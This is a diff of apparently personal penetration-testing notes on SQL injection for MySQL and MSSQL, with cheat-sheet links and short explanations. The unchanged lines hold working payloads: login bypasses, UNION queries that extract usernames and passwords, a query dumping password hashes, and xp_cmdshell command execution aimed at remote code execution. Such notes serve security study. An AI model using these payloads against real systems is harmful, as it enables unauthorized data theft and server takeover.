@@ -1,16 +1,16 @@
-
-## Links
+## SQL
+### Links
 
 - [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
 - [MSSQL Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
-# SQLi
+- [SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
+- [From MSSQL to RCE](https://bhavsec.com/posts/mssql-rce/)
+### SQLi
 
 Only Resources you will need to get Remote code using SQLi
+### MYSQL
 
-
-## MYSQL
-
-### Authenticated SQLi
+#### Authenticated SQLi
 
 ```
 SELECT version();
@@ -27,7 +27,7 @@ SELECT * from <test>.<users>; # here test is DB and the user is a table in test 
 SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
 ```
 
-### Error based SQLi
+#### Error based SQLi
 ```
 tom' OR 1=1 -- //
 ' or 1=1 in (select @@version) -- //
@@ -36,7 +36,7 @@ tom' OR 1=1 -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // # password for admin user
 ```
 
-### Union-based SQLi
+#### Union-based SQLi
 
 ```
 *** injected UNION query has to include the same number of columns in the original query
@@ -62,9 +62,9 @@ tom' OR 1=1 -- //
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 
-## # MSSQL
+### MSSQL
 
-### Authenticated SQLi
+#### Authenticated SQLi
 
 ```
 SELECT @@version;
@@ -81,7 +81,7 @@ guest guest  # user # pass
 ```
 
 
-### Extra Notes I had
+#### Extra Notes I had
 
 ```
 #### Line Comments
@@ -170,14 +170,14 @@ EXECUTE xp_cmdshell 'whoami';
 
 ```
 
-### Error-Based SQL Injection
+#### Error-Based SQL Injection
 
 - **Goal**: To generate an error message from the SQL database.
 - **Method**: Include SQL control characters or SQL code into a query.
 - **Example**: Inputting `' OR 1=1 --` in a user input field. If the backend query is `SELECT * FROM users WHERE username = '[input]'`, it becomes `SELECT * FROM users WHERE username = '' OR 1=1 --'`.
 - **Result**: The database returns an error or unexpected data, indicating vulnerability.
 
-### Union-Based SQL Injection
+#### Union-Based SQL Injection
 
 - **Goal**: Retrieve data from other tables.
 - **Method**: Utilize the `UNION` SQL operator to combine results from multiple SELECT queries.
@@ -185,13 +185,13 @@ EXECUTE xp_cmdshell 'whoami';
 	- ' UNION SELECT null, null, database(), user(), @@version  -- //
 - **Consideration**: Columns data types and number must match between the original and UNION query.
 
-### Blind SQL Injection
+#### Blind SQL Injection
 
 - **Goal**: Retrieve data when no error message or data is directly returned.
 - **Method**: Ask the database a true/false question and determine the answer based on the application's response.
 - **Example**: Change a query to `SELECT * FROM users WHERE username = 'admin' AND 1=1 --`. If the page loads normally, the query is true. If it doesn't, the query is false.
 
-### Time-Based SQL Injection
+#### Time-Based SQL Injection
 
 - **Goal**: Gather information from a database when no data is returned to the user.
 - **Method**: Use SQL commands that delay the response.
